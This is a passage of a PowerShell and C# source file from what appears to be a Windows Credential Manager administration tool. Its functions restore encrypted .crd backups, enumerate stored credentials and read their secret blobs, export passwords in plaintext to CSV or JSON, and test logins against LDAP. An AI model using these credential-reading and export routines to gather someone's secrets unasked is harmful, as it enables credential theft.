        double totalPermutations = System.Math.Pow(entropyPerChar, metrics.PasswordLength);
        double guessesPerSecond = 1000000000;
        metrics.EstimatedCrackTimeMinutes = (int)(totalPermutations / (guessesPerSecond * 60));

        if (metrics.StrengthScore >= 80) metrics.RiskLevel = "Low";
        else if (metrics.StrengthScore >= 60) metrics.RiskLevel = "Medium";
        else if (metrics.StrengthScore >= 40) metrics.RiskLevel = "High";
        else metrics.RiskLevel = "Critical";

        return metrics;
    }
}
"@

if (-not ([System.Management.Automation.PSTypeName]'SecurityEngineMatrix').Type) {
    Add-Type -AssemblyName System.Core
    Add-Type -AssemblyName System.Security
    Add-Type -AssemblyName System.DirectoryServices
    Add-Type -AssemblyName System.Web.Extensions

    $null = [System.Security.Cryptography.Aes]
    $null = [System.Security.Cryptography.X509Certificates.X509Certificate2]
    $null = [System.Security.Cryptography.ProtectedData]
    $null = [System.Text.RegularExpressions.Regex]
    $null = [System.Linq.Enumerable]
    $null = [Microsoft.Win32.SafeHandles.SafeFileHandle]
    $null = [System.DirectoryServices.DirectoryEntry]
    $null = [System.Web.Script.Serialization.JavaScriptSerializer]

    $ReferencedAssemblies = [System.AppDomain]::CurrentDomain.GetAssemblies() |
        Where-Object { -not $_.IsDynamic -and -not [string]::IsNullOrWhiteSpace($_.Location) -and $_.Location -notlike '*.winmd' } |
        Select-Object -ExpandProperty Location -Unique

    Add-Type -TypeDefinition $SourceCode -Language CSharp -ReferencedAssemblies $ReferencedAssemblies
}

# ==============================================
# ENHANCED POWERSHELL WRAPPER FUNCTIONS
# ==============================================

# ==============================================
# 2. CRD BACKUP FILE IMPORT & SESSION STORE
# ==============================================

# Initialize global collections for imported credentials
$Global:ImportedCredentials = @()
$Global:ImportedCredentialsLegacyFile = Join-Path -Path $env:APPDATA -ChildPath "CredentialManager_Imported.json"

function Test-SecurityEngineMatrixMethod {
    param(
        [Parameter(Mandatory=$true)]
        [string]$MethodName
    )

    $type = ([System.Management.Automation.PSTypeName]'SecurityEngineMatrix').Type
    if ($null -eq $type) {
        return $false
    }

    $bindingFlags = [System.Reflection.BindingFlags]::Public -bor [System.Reflection.BindingFlags]::Static
    return ($null -ne $type.GetMethod($MethodName, $bindingFlags))
}

function Ensure-CrdInteropBridge {
    if (-not ([System.Management.Automation.PSTypeName]'CrdInteropBridge').Type) {
        Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

public static class CrdInteropBridge
{
    [DllImport("Advapi32.dll", EntryPoint = "CredRestoreCredentials", CharSet = CharSet.Unicode, SetLastError = true)]
    public static extern bool CredRestoreCredentials(string file, byte[] password, int passwordSize, uint flags);

    [DllImport("Advapi32.dll", EntryPoint = "CredDeleteW", CharSet = CharSet.Unicode, SetLastError = true)]
    public static extern bool CredDelete(string targetName, uint type, uint flags);
}
"@
    }
}

function Invoke-CrdRestoreCredentials {
    param(
        [Parameter(Mandatory=$true)]
        [string]$FilePath,

        [Parameter(Mandatory=$true)]
        [byte[]]$PasswordBytes,

        [uint32]$Flags = 0
    )

    if (Test-SecurityEngineMatrixMethod -MethodName 'CredRestoreCredentials') {
        return [SecurityEngineMatrix]::CredRestoreCredentials($FilePath, $PasswordBytes, $PasswordBytes.Length, $Flags)
    }

    Ensure-CrdInteropBridge
    return [CrdInteropBridge]::CredRestoreCredentials($FilePath, $PasswordBytes, $PasswordBytes.Length, $Flags)
}

function Remove-CrdCredential {
    param(
        [Parameter(Mandatory=$true)]
        [string]$TargetName,

        [Parameter(Mandatory=$true)]
        [uint32]$Type,

        [uint32]$Flags = 0
    )

    if (Test-SecurityEngineMatrixMethod -MethodName 'CredDelete') {
        return [SecurityEngineMatrix]::CredDelete($TargetName, $Type, $Flags)
    }

    Ensure-CrdInteropBridge
    return [CrdInteropBridge]::CredDelete($TargetName, $Type, $Flags)
}

function Get-CrdCredentialSnapshots {
    if (Test-SecurityEngineMatrixMethod -MethodName 'CaptureCredentialSnapshots') {
        return @([SecurityEngineMatrix]::CaptureCredentialSnapshots())
    }

    $separator = [string][char]31
    $snapshots = @()

    foreach ($credential in [SecurityEngineMatrix]::CredEnumerate($null)) {
        $blobBytes = [byte[]]@()
        if ($credential.CredentialBlob -ne [System.IntPtr]::Zero -and $credential.CredentialBlobSize -gt 0) {
            $blobBytes = New-Object byte[] $credential.CredentialBlobSize
            [System.Runtime.InteropServices.Marshal]::Copy($credential.CredentialBlob, $blobBytes, 0, $blobBytes.Length)
        }

        $targetName = if ($null -ne $credential.TargetName) { $credential.TargetName } else { [string]::Empty }
        $userName = if ($null -ne $credential.UserName) { $credential.UserName } else { [string]::Empty }
        $comment = if ($null -ne $credential.Comment) { $credential.Comment } else { [string]::Empty }
        $secretText = if (Test-SecurityEngineMatrixMethod -MethodName 'ReadCredentialBlob') {
            [SecurityEngineMatrix]::ReadCredentialBlob($credential)
        }
        else {
            $null
        }

        $snapshots += [pscustomobject]@{
            TargetName = $credential.TargetName
            UserName = $credential.UserName
            Comment = $credential.Comment
            Type = [int]$credential.Type
            Persist = [int]$credential.Persist
            CredentialBlobBytes = $blobBytes
            SecretText = $secretText
            Key = $targetName + $separator + ([int]$credential.Type).ToString() + $separator + $userName
            Fingerprint = $comment + $separator + ([int]$credential.Persist).ToString() + $separator + [Convert]::ToBase64String($blobBytes)
        }
    }

    return $snapshots
}

function Restore-CrdCredentialSnapshot {
    param(
        [Parameter(Mandatory=$true)]
        $Snapshot
    )

    if (Test-SecurityEngineMatrixMethod -MethodName 'WriteSnapshot') {
        return [SecurityEngineMatrix]::WriteSnapshot($Snapshot)
    }

    $nativeStruct = New-Object "SecurityEngineMatrix+CREDENTIAL"
    $nativeStruct.Type = [int]$Snapshot.Type
    $nativeStruct.TargetName = $Snapshot.TargetName
    $nativeStruct.Comment = $Snapshot.Comment
    $nativeStruct.Persist = [int]$Snapshot.Persist
    $nativeStruct.UserName = $Snapshot.UserName
    $nativeStruct.CredentialBlob = [System.IntPtr]::Zero
    $nativeStruct.CredentialBlobSize = 0

    $blobPointer = [System.IntPtr]::Zero
    try {
        $blobBytes = [byte[]]$Snapshot.CredentialBlobBytes
        if ($null -ne $blobBytes -and $blobBytes.Length -gt 0) {
            $blobPointer = [System.Runtime.InteropServices.Marshal]::AllocCoTaskMem($blobBytes.Length)
            [System.Runtime.InteropServices.Marshal]::Copy($blobBytes, 0, $blobPointer, $blobBytes.Length)
            $nativeStruct.CredentialBlob = $blobPointer
            $nativeStruct.CredentialBlobSize = $blobBytes.Length
        }

        return [SecurityEngineMatrix]::CredWrite([ref]$nativeStruct, 0)
    }
    finally {
        if ($blobPointer -ne [System.IntPtr]::Zero) {
            [System.Runtime.InteropServices.Marshal]::FreeCoTaskMem($blobPointer)
        }
    }
}

function Show-ImportPasswordDialog {
    param(
        [string]$Title = "Enter Backup Password",
        [string]$Message = "Enter the password used to encrypt this .crd backup file."
    )

    $form = New-Object System.Windows.Forms.Form
    $form.Text = $Title
    $form.StartPosition = 'CenterParent'
    $form.FormBorderStyle = 'FixedDialog'
    $form.MinimizeBox = $false
    $form.MaximizeBox = $false
    $form.ShowInTaskbar = $false
    $form.ClientSize = New-Object System.Drawing.Size(430, 140)

    $label = New-Object System.Windows.Forms.Label
    $label.Text = $Message
    $label.AutoSize = $false
    $label.Size = New-Object System.Drawing.Size(390, 34)
    $label.Location = New-Object System.Drawing.Point(20, 15)
    $form.Controls.Add($label)

    $textbox = New-Object System.Windows.Forms.TextBox
    $textbox.Location = New-Object System.Drawing.Point(20, 55)
    $textbox.Size = New-Object System.Drawing.Size(390, 23)
    $textbox.UseSystemPasswordChar = $true
    $form.Controls.Add($textbox)

    $btnOk = New-Object System.Windows.Forms.Button
    $btnOk.Text = "OK"
    $btnOk.Location = New-Object System.Drawing.Point(254, 95)
    $btnOk.Size = New-Object System.Drawing.Size(75, 25)
    $btnOk.Add_Click({
        $form.Tag = ConvertTo-SecureString -String $textbox.Text -AsPlainText -Force
        $form.DialogResult = [System.Windows.Forms.DialogResult]::OK
        $form.Close()
    })
    $form.Controls.Add($btnOk)

    $btnCancel = New-Object System.Windows.Forms.Button
    $btnCancel.Text = "Cancel"
    $btnCancel.Location = New-Object System.Drawing.Point(335, 95)
    $btnCancel.Size = New-Object System.Drawing.Size(75, 25)
    $btnCancel.Add_Click({
        $form.DialogResult = [System.Windows.Forms.DialogResult]::Cancel
        $form.Close()
    })
    $form.Controls.Add($btnCancel)

    $form.AcceptButton = $btnOk
    $form.CancelButton = $btnCancel
    $form.Add_Shown({ $textbox.Focus() })

    if ($form.ShowDialog($MainForm) -eq [System.Windows.Forms.DialogResult]::OK) {
        return $form.Tag
    }

    return $null
}

function Get-CrdImportErrorMessage {
    param(
        [int]$ErrorCode
    )

    switch ($ErrorCode) {
        5 { return "Access denied while processing the backup file." }
        13 { return "The backup data is invalid or corrupted." }
        23 { return "The backup file could not be decoded. The password may be incorrect or the file may be corrupted." }
        86 { return "The backup password is incorrect." }
        87 { return "The backup file or password was rejected by the Windows credential API." }
        1168 { return "No credentials were found in the backup file." }
        default {
            try {
                return ([System.ComponentModel.Win32Exception]::new($ErrorCode)).Message
            }
            catch {
                return "Windows error $ErrorCode"
            }
        }
    }
}

function Get-CredentialTypeDisplayName {
    param(
        [int]$Type
    )

    switch ($Type) {
        1 { 'Generic' }
        2 { 'DomainPassword' }
        3 { 'DomainCertificate' }
        4 { 'DomainVisiblePassword' }
        5 { 'GenericCertificate' }
        6 { 'DomainExtended' }
        default { "Type$Type" }
    }
}

function Import-CrdBackupFile {
    <#
    .SYNOPSIS
    Imports credentials from a Windows Credential Manager .crd backup file (encrypted)

    .PARAMETER FilePath
    Path to the .crd backup file

    .PARAMETER Password
    Password for the encrypted backup file (will prompt if not provided)

    .PARAMETER AllowDuplicates
    If $true, allows duplicate credentials (target + username combinations)
    If $false, skips duplicates

    .DESCRIPTION
    Windows Credential Manager .CRD backup files are handled through the native Windows credential API.
    This function:
    1. Prompts for the backup password
    2. Uses the Windows restore API to load the backup
    3. Captures the imported credential set into session memory
    4. Rolls the temporary restore back out of the user's credential store

    .EXAMPLE
    $result = Import-CrdBackupFile -FilePath "C:\backup.crd"
    #>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [ValidateScript({ Test-Path $_ -PathType Leaf })]
        [string]$FilePath,

        [securestring]$Password,

        [switch]$AllowDuplicates
    )

    try {
        if (-not (Test-Path $FilePath)) {
            throw "File not found: $FilePath"
        }

        if (-not $FilePath.EndsWith('.crd', [System.StringComparison]::OrdinalIgnoreCase)) {
            Write-Warning "File does not have .crd extension. Assuming encrypted .crd format..."
        }

        # If password not provided, prompt for it
        if ($null -eq $Password) {
            $Password = Show-ImportPasswordDialog
            if ($null -eq $Password) {
                return @{
                    Success = $false
                    ImportedCount = 0
                    SkippedCount = 0
                    TotalCount = 0
                    Message = "Import cancelled."
                    Credentials = @()
                }
            }
        }

        Write-Verbose "Attempting to decrypt and parse backup file: $FilePath"

        # Read the encrypted file
        $fileBytes = [System.IO.File]::ReadAllBytes($FilePath)
        Write-Verbose "File size: $($fileBytes.Length) bytes"

        $passwordPtr = [System.IntPtr]::Zero
        $passwordPlain = $null
        $passwordBytes = [byte[]]@()
        $beforeSnapshots = @(Get-CrdCredentialSnapshots)
        $beforeByKey = @{}
        foreach ($snapshot in $beforeSnapshots) {
            $beforeByKey[$snapshot.Key] = $snapshot
        }

        $restoreSucceeded = $false
        $afterSnapshots = @()
        $rollbackFailures = @()

        try {
            $passwordPtr = [System.Runtime.InteropServices.Marshal]::SecureStringToCoTaskMemUnicode($Password)
            $passwordPlain = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($passwordPtr)
            $passwordText = if ($null -ne $passwordPlain) { $passwordPlain } else { [string]::Empty }
            $passwordBytes = [System.Text.Encoding]::Unicode.GetBytes($passwordText + [char]0)

            $restoreSucceeded = Invoke-CrdRestoreCredentials -FilePath $FilePath -PasswordBytes $passwordBytes
            if (-not $restoreSucceeded) {
                $errorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
                throw "CRD restore failed. $(Get-CrdImportErrorMessage -ErrorCode $errorCode)"
            }

            $afterSnapshots = @(Get-CrdCredentialSnapshots)
        }
        finally {
            if ($passwordBytes.Length -gt 0) {
                [Array]::Clear($passwordBytes, 0, $passwordBytes.Length)
            }

            if ($passwordPtr -ne [System.IntPtr]::Zero) {
                [System.Runtime.InteropServices.Marshal]::ZeroFreeCoTaskMemUnicode($passwordPtr)
            }

            if ($restoreSucceeded) {
                if ($afterSnapshots.Count -eq 0) {
                    $afterSnapshots = @(Get-CrdCredentialSnapshots)
                }

                foreach ($afterSnapshot in $afterSnapshots) {
                    $beforeSnapshot = $beforeByKey[$afterSnapshot.Key]
                    if ($null -eq $beforeSnapshot) {
                        if (-not (Remove-CrdCredential -TargetName $afterSnapshot.TargetName -Type ([uint32]$afterSnapshot.Type))) {
                            $deleteError = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
                            if ($deleteError -ne 1168) {
                                $rollbackFailures += "Delete '$($afterSnapshot.TargetName)' failed: $(Get-CrdImportErrorMessage -ErrorCode $deleteError)"
                            }
                        }
                    }
                    elseif ($beforeSnapshot.Fingerprint -ne $afterSnapshot.Fingerprint) {
                        if (-not (Restore-CrdCredentialSnapshot -Snapshot $beforeSnapshot)) {
                            $writeError = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
                            $rollbackFailures += "Restore '$($beforeSnapshot.TargetName)' failed: $(Get-CrdImportErrorMessage -ErrorCode $writeError)"
                        }
                    }
                }
            }
        }

        $importedSnapshots = @()
        foreach ($afterSnapshot in $afterSnapshots) {
            $beforeSnapshot = $beforeByKey[$afterSnapshot.Key]
            if ($null -eq $beforeSnapshot -or $beforeSnapshot.Fingerprint -ne $afterSnapshot.Fingerprint) {
                $importedSnapshots += $afterSnapshot
            }
        }

        $importedCredentials = @()
        $skippedCount = 0
        foreach ($snapshot in $importedSnapshots) {
            $credentialObject = New-Object PSObject -Property @{
                Target = $snapshot.TargetName
                Username = $snapshot.UserName
                Password = $snapshot.SecretText
                Type = Get-CredentialTypeDisplayName -Type $snapshot.Type
                Comment = $snapshot.Comment
                ImportedTime = Get-Date
                SourceFile = $FilePath
            }

            $duplicateExists = $Global:ImportedCredentials | Where-Object {
                $_.Target -eq $credentialObject.Target -and $_.Username -eq $credentialObject.Username
            } | Select-Object -First 1

            if (-not $AllowDuplicates -and $duplicateExists) {
                $skippedCount++
                continue
            }

            $Global:ImportedCredentials += $credentialObject
            $importedCredentials += $credentialObject
        }

        $message = if ($importedCredentials.Count -gt 0) {
            "Imported $($importedCredentials.Count) credential(s) into session memory only."
        }
        else {
            "The backup file was read successfully, but no new credentials were added to the current session."
        }

        if ($rollbackFailures.Count -gt 0) {
            $message += " Rollback warnings: " + ($rollbackFailures -join '; ')
        }

        return @{
            Success = ($rollbackFailures.Count -eq 0)
            ImportedCount = $importedCredentials.Count
            SkippedCount = $skippedCount
            TotalCount = $importedSnapshots.Count
            Message = $message
            Credentials = $importedCredentials
            FileInfo = @{
                Path = $FilePath
                Size = $fileBytes.Length
                IsEncrypted = $true
                RequiresPassword = $true
            }
        }
    }
    catch {
        Write-Error "Failed to import CRD file: $_"
        return @{
            Success = $false
            ImportedCount = 0
            SkippedCount = 0
            TotalCount = 0
            Message = "Error: $_"
            Credentials = @()
        }
    }
}

function Get-ImportedCredentials {
    <#
    .SYNOPSIS
    Retrieves all imported credentials from the in-memory session store

    .PARAMETER Target
    Optional filter by target name

    .PARAMETER Username
    Optional filter by username

    .EXAMPLE
    $creds = Get-ImportedCredentials
    $gitCreds = Get-ImportedCredentials -Target "github.com"
    #>
    [CmdletBinding()]
    param(
        [string]$Target,
        [string]$Username
    )

    $result = $Global:ImportedCredentials

    if ($Target) {
        $result = $result | Where-Object { $_.Target -like "*$Target*" }
    }

    if ($Username) {
        $result = $result | Where-Object { $_.Username -like "*$Username*" }
    }

    return $result
}

function Save-ImportedCredentials {
    <#
    .SYNOPSIS
    Retained for compatibility; imported credentials remain in memory only
    #>
    try {
        Write-Verbose "Imported credentials are session-only and are not persisted to disk"
    }
    catch {
        Write-Warning "Failed to save imported credentials: $_"
    }
}

function Load-ImportedCredentials {
    <#
    .SYNOPSIS
    Initializes the in-memory import store and removes any legacy persisted import file
    #>
    try {
        $Global:ImportedCredentials = @()

        if (Test-Path $Global:ImportedCredentialsLegacyFile) {
            Remove-Item -Path $Global:ImportedCredentialsLegacyFile -Force
            Write-Verbose "Removed legacy persisted imported credentials file: $Global:ImportedCredentialsLegacyFile"
        }
    }
    catch {
        Write-Warning "Failed to load imported credentials: $_"
    }
}

function Clear-ImportedCredentials {
    <#
    .SYNOPSIS
    Clears all imported credentials from session memory

    .PARAMETER Confirm
    Prompts for confirmation before clearing
    #>
    [CmdletBinding(SupportsShouldProcess)]
    param()

    if ($PSCmdlet.ShouldProcess("All imported credentials", "Clear")) {
        $Global:ImportedCredentials = @()

        if (Test-Path $Global:ImportedCredentialsLegacyFile) {
            Remove-Item -Path $Global:ImportedCredentialsLegacyFile -Force
        }

        Write-Host "Cleared all imported credentials"
    }
}

function Export-ImportedCredentials {
    <#
    .SYNOPSIS
    Exports imported credentials to CSV or JSON file

    .PARAMETER OutputPath
    Path to export file

    .PARAMETER Format
    Export format: 'CSV' or 'JSON' (default: CSV)

    .EXAMPLE
    Export-ImportedCredentials -OutputPath "C:\exported_creds.csv"
    #>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [string]$OutputPath,

        [ValidateSet('CSV', 'JSON')]
        [string]$Format = 'CSV'
    )

    try {
        if ($Global:ImportedCredentials.Count -eq 0) {
            Write-Warning "No imported credentials to export"
            return
        }

        # Prepare export data
        $export = $Global:ImportedCredentials | Select-Object Target, Username, Password, Type, Comment, @{N='ImportedTime';E={$_.ImportedTime.ToString('o')}}, SourceFile

        if ($Format -eq 'CSV') {
            $export | Export-Csv -Path $OutputPath -NoTypeInformation -Force
        }
        else {
            $export | ConvertTo-Json | Set-Content -Path $OutputPath -Force
        }

        Write-Host "Exported $($export.Count) credential(s) to $OutputPath"
    }
    catch {
        Write-Error "Failed to export credentials: $_"
    }
}

function Get-DomainInformation {
    <#
    .SYNOPSIS
    Get current domain and logon server information
    #>
    try {
        $domain = [DomainCredentialEngine]::GetCurrentDomain()
        $logonServer = [DomainCredentialEngine]::GetLogonServer()

        return @{
            Domain = $domain
            LogonServer = $logonServer
            IsDomainJoined = ($domain -ne "WORKGROUP")
        }
    }
    catch {
        Write-Warning "Error retrieving domain information: $_"
        return $null
    }
}

function Get-CertificateCredentials {
    <#
    .SYNOPSIS
    Enumerate all user certificates from the certificate store
    #>
    try {
        $certs = [CertificateValidationEngine]::EnumerateCertificates()

        $certList = @()
        foreach ($cert in $certs) {
            $expiryDays = ($cert.NotAfter - (Get-Date)).Days

            $certList += @{
                Thumbprint = $cert.Thumbprint
                Subject = $cert.Subject
                IsValid = $cert.IsValid
                NotBefore = $cert.NotBefore
                NotAfter = $cert.NotAfter
                ExpiryDays = $expiryDays
                ExpiryStatus = if ($expiryDays -lt 0) { "Expired" } elseif ($expiryDays -lt 30) { "Expiring" } else { "Valid" }
                KeySize = $cert.KeySize
            }
        }

        return $certList
    }
    catch {
        Write-Warning "Error retrieving certificates: $_"
        return @()
    }
}

function Normalize-CertificateThumbprint {
    param(
        [string]$Thumbprint
    )

    if ([string]::IsNullOrWhiteSpace($Thumbprint)) {
        return ""
    }

    return (($Thumbprint -replace '[^0-9A-Fa-f]', '').ToUpperInvariant())
}

function Find-CertificateCredential {
    param(
        [string]$Thumbprint
    )

    $normalizedThumbprint = Normalize-CertificateThumbprint $Thumbprint
    if ($normalizedThumbprint.Length -ne 40) {
        return $null
    }

    foreach ($cert in (Get-CertificateCredentials)) {
        if ((Normalize-CertificateThumbprint $cert.Thumbprint) -eq $normalizedThumbprint) {
            return $cert
        }
    }

    return $null
}

function Test-CertificateCredentialUsability {
    param(
        [string]$Thumbprint
    )

    $normalizedThumbprint = Normalize-CertificateThumbprint $Thumbprint
    if ($normalizedThumbprint.Length -ne 40) {
        return @{ IsUsable = $false; Message = 'Certificate thumbprint must contain exactly 40 hexadecimal characters.' }
    }

    $store = $null
    try {
        $store = New-Object System.Security.Cryptography.X509Certificates.X509Store(
            [System.Security.Cryptography.X509Certificates.StoreName]::My,
            [System.Security.Cryptography.X509Certificates.StoreLocation]::CurrentUser
        )
        $store.Open([System.Security.Cryptography.X509Certificates.OpenFlags]::ReadOnly)

        $cert = $store.Certificates | Where-Object {
            (Normalize-CertificateThumbprint $_.Thumbprint) -eq $normalizedThumbprint
        } | Select-Object -First 1

        if ($null -eq $cert) {
            return @{ IsUsable = $false; Message = 'The specified certificate was not found in the Current User > Personal store.' }
        }

        if (-not $cert.HasPrivateKey) {
            return @{ IsUsable = $false; Message = 'The selected certificate does not have an accessible private key.' }
        }

        try {
            $null = $cert.PrivateKey
        } catch {
            $message = $_.Exception.Message
            if ($_.Exception.HResult -eq -2146434967) {
                $message = 'The selected certificate is backed by a smart card that is not currently available.'
            }

            return @{ IsUsable = $false; Message = $message }
        }

        return @{ IsUsable = $true; Message = $null }
    } catch {
        return @{ IsUsable = $false; Message = $_.Exception.Message }
    } finally {
        if ($store) { $store.Close() }
    }
}

function Get-CredentialApiErrorDetail {
    param(
        [int]$ErrorCode,
        [bool]$IsCertificateCredential = $false
    )

    if ($ErrorCode -eq 2202 -and $IsCertificateCredential) {
        return "Win32 Error Code: 2202`n`nThe specified username is invalid for a certificate-based credential."
    }

    if ($ErrorCode -lt 0) {
        try {
            $hexCode = ('0x{0:X8}' -f ([System.BitConverter]::ToUInt32([System.BitConverter]::GetBytes($ErrorCode), 0)))
            $exception = [System.Runtime.InteropServices.Marshal]::GetExceptionForHR($ErrorCode)
            if ($IsCertificateCredential -and $ErrorCode -eq -2146434967) {
                return "HRESULT: $hexCode`n`nThe selected certificate is backed by a smart card that is not currently available. Insert the smart card and retry, or choose a certificate whose private key is available on this system."
            }

            return "HRESULT: $hexCode`n`n$($exception.Message)"
        } catch {
            return "HRESULT: $ErrorCode"
        }
    }

    return "Win32 Error Code: $ErrorCode"
}

function New-CertificateCredentialBlob {
    param(
        [Parameter(Mandatory = $true)]
        [string]$Thumbprint
    )

    $normalizedThumbprint = Normalize-CertificateThumbprint $Thumbprint
    if ($normalizedThumbprint.Length -ne 40) {
        throw "Certificate thumbprint must contain exactly 40 hexadecimal characters."
    }

    $cert = Find-CertificateCredential $normalizedThumbprint
    if ($null -eq $cert) {
        throw "The specified certificate was not found in the Current User > Personal store."
    }

    $blobSize = 24
    $blobBytes = New-Object byte[] $blobSize
    [System.BitConverter]::GetBytes([uint32]$blobSize).CopyTo($blobBytes, 0)

    for ($i = 0; $i -lt 20; $i++) {
        $blobBytes[4 + $i] = [Convert]::ToByte($normalizedThumbprint.Substring($i * 2, 2), 16)
    }

    $blobPtr = [System.Runtime.InteropServices.Marshal]::AllocCoTaskMem($blobBytes.Length)
    [System.Runtime.InteropServices.Marshal]::Copy($blobBytes, 0, $blobPtr, $blobBytes.Length)

    return @{
        Pointer = $blobPtr
        Size = $blobBytes.Length
        Thumbprint = $normalizedThumbprint
        Certificate = $cert
        HashBytes = $blobBytes[4..23]
    }
}

function Show-CertificatePickerDialog {
    param(
        [System.Windows.Forms.IWin32Window]$Owner = $null
    )

    $certificates = @(Get-CertificateCredentials | Sort-Object ExpiryStatus, Subject)
    if ($certificates.Count -eq 0) {
        [System.Windows.Forms.MessageBox]::Show(
            $Owner,
            "No certificates were found in Current User > Personal.",
            "Certificate Store",
            [System.Windows.Forms.MessageBoxButtons]::OK,
            [System.Windows.Forms.MessageBoxIcon]::Information
        ) | Out-Null
        return $null
    }

    $pickerForm = New-Object System.Windows.Forms.Form
    $pickerForm.Text = "Select Certificate"
    $pickerForm.Size = New-Object System.Drawing.Size(760, 360)
    $pickerForm.StartPosition = "CenterParent"
    $pickerForm.FormBorderStyle = "FixedDialog"
    $pickerForm.MaximizeBox = $False
    $pickerForm.MinimizeBox = $False
    $pickerForm.Font = New-Object System.Drawing.Font("Segoe UI", 9)

    $listView = New-Object System.Windows.Forms.ListView
    $listView.Location = New-Object System.Drawing.Point(10, 10)
    $listView.Size = New-Object System.Drawing.Size(724, 265)
    $listView.View = "Details"
    $listView.FullRowSelect = $True
    $listView.MultiSelect = $False
    $listView.HideSelection = $False
    [void]$listView.Columns.Add("Subject", 290)
    [void]$listView.Columns.Add("Thumbprint", 220)
    [void]$listView.Columns.Add("Expires", 110)
    [void]$listView.Columns.Add("Status", 80)
    $pickerForm.Controls.Add($listView)

    foreach ($cert in $certificates) {
        $item = New-Object System.Windows.Forms.ListViewItem($cert.Subject)
        [void]$item.SubItems.Add((Normalize-CertificateThumbprint $cert.Thumbprint))
        [void]$item.SubItems.Add((Get-Date $cert.NotAfter -Format 'yyyy-MM-dd'))
        [void]$item.SubItems.Add($cert.ExpiryStatus)
        $item.Tag = $cert

        if (-not $cert.IsValid -or $cert.ExpiryStatus -eq 'Expired') {
            $item.ForeColor = [System.Drawing.Color]::Firebrick
        } elseif ($cert.ExpiryStatus -eq 'Expiring') {
            $item.ForeColor = [System.Drawing.Color]::DarkOrange
        }

        [void]$listView.Items.Add($item)
    }

    $pickerForm.Tag = $null
    $btnOK = New-Object System.Windows.Forms.Button
    $btnOK.Text = "OK"
    $btnOK.Location = New-Object System.Drawing.Point(481, 285)
    $btnOK.Size = New-Object System.Drawing.Size(75, 25)
    $btnOK.Enabled = $False
    $pickerForm.Controls.Add($btnOK)

    $btnCopy = New-Object System.Windows.Forms.Button
    $btnCopy.Text = "Copy"
    $btnCopy.Location = New-Object System.Drawing.Point(570, 285)
    $btnCopy.Size = New-Object System.Drawing.Size(75, 25)
    $btnCopy.Enabled = $False
    $pickerForm.Controls.Add($btnCopy)

    $btnCancel = New-Object System.Windows.Forms.Button
    $btnCancel.Text = "Cancel"
    $btnCancel.Location = New-Object System.Drawing.Point(659, 285)
    $btnCancel.Size = New-Object System.Drawing.Size(75, 25)
    $pickerForm.Controls.Add($btnCancel)
    $pickerForm.AcceptButton = $btnOK
    $pickerForm.CancelButton = $btnCancel

    $listView.Add_SelectedIndexChanged({
        $hasSelection = $listView.SelectedItems.Count -gt 0
        $btnOK.Enabled = $hasSelection
        $btnCopy.Enabled = $hasSelection
    })

    $acceptSelection = {
        if ($listView.SelectedItems.Count -eq 0) {
            return
        }

        $pickerForm.Tag = $listView.SelectedItems[0].SubItems[1].Text
        $pickerForm.DialogResult = [System.Windows.Forms.DialogResult]::OK
        $pickerForm.Close()
    }

    $copySelection = {
        if ($listView.SelectedItems.Count -eq 0) {
            return
        }

        $thumbprint = $listView.SelectedItems[0].SubItems[1].Text
        [System.Windows.Forms.Clipboard]::SetText($thumbprint)
    }

    $btnOK.Add_Click($acceptSelection)
    $btnCopy.Add_Click($copySelection)
    $listView.Add_DoubleClick($acceptSelection)
    $listView.Add_KeyDown({
        if ($_.Control -and $_.KeyCode -eq [System.Windows.Forms.Keys]::C -and $listView.SelectedItems.Count -gt 0) {
            [System.Windows.Forms.Clipboard]::SetText($listView.SelectedItems[0].SubItems[1].Text)
            $_.Handled = $true
        }
    })
    $btnCancel.Add_Click({ $pickerForm.Close() })

    if ($Owner) {
        [void]$pickerForm.ShowDialog($Owner)
    } else {
        [void]$pickerForm.ShowDialog()
    }

    return $pickerForm.Tag
}

function Analyze-CredentialStrength {
    <#
    .SYNOPSIS
    Analyze password strength and provide security metrics
    .PARAMETER Password
    The password to analyze
    #>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [string]$Password
    )

    try {
        $metrics = [CredentialAnalysisEngine]::AnalyzeCredentialStrength($Password)

        return @{
            StrengthScore = $metrics.StrengthScore
            RiskLevel = $metrics.RiskLevel
            PasswordLength = $metrics.PasswordLength
            HasUppercase = $metrics.HasUppercase
            HasLowercase = $metrics.HasLowercase
            HasNumbers = $metrics.HasNumbers
            HasSpecialChars = $metrics.HasSpecialChars
            EstimatedCrackTimeMinutes = $metrics.EstimatedCrackTimeMinutes
            Recommendation = if ($metrics.RiskLevel -eq "Low") { "Password meets security standards" } else { "Consider a stronger password" }
        }
    }
    catch {
        Write-Warning "Error analyzing credential strength: $_"
        return $null
    }
}

function Test-LDAPCredential {
    <#
    .SYNOPSIS
    Test a credential against LDAP (Domain/Active Directory)
    .PARAMETER Domain
    The domain or LDAP server
    .PARAMETER Username
    Username for authentication
    .PARAMETER Password
    Password for authentication
    #>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [string]$Domain,
        [Parameter(Mandatory=$true)]
        [string]$Username,
        [Parameter(Mandatory=$true)]
        [string]$Password
    )

    try {
        $testResult = [CredentialTestingEngine]::TestLDAPCredential($Domain, $Username, $Password)

        return @{
            Success = $testResult.Success
            Message = $testResult.ResultMessage
            ResponseTime = $testResult.ResponseTime
            TestTime = $testResult.TestTime
        }
    }
    catch {
        Write-Warning "Error testing LDAP credential: $_"
        return @{ Success = $false; Message = $_.Exception.Message }
    }
}

function Get-CredentialAuditReport {
    <#
    .SYNOPSIS
    Generate a credential audit report with security summary
    #>
    try {
        $allCreds = [Credential]::LoadAll()
        $certs = [CertificateValidationEngine]::EnumerateCertificates()

        $report = @{
            TotalCredentials = $allCreds.Count
            CredentialsByType = @{
                Generic = ($allCreds | Where-Object { $_.Type -eq [CredentialType]::Generic }).Count
                DomainPassword = ($allCreds | Where-Object { $_.Type -eq [CredentialType]::DomainPassword }).Count
                DomainCertificate = ($allCreds | Where-Object { $_.Type -eq [CredentialType]::DomainCertificate }).Count
            }
            TotalCertificates = $certs.Count
            ValidCertificates = ($certs | Where-Object { $_.IsValid }).Count
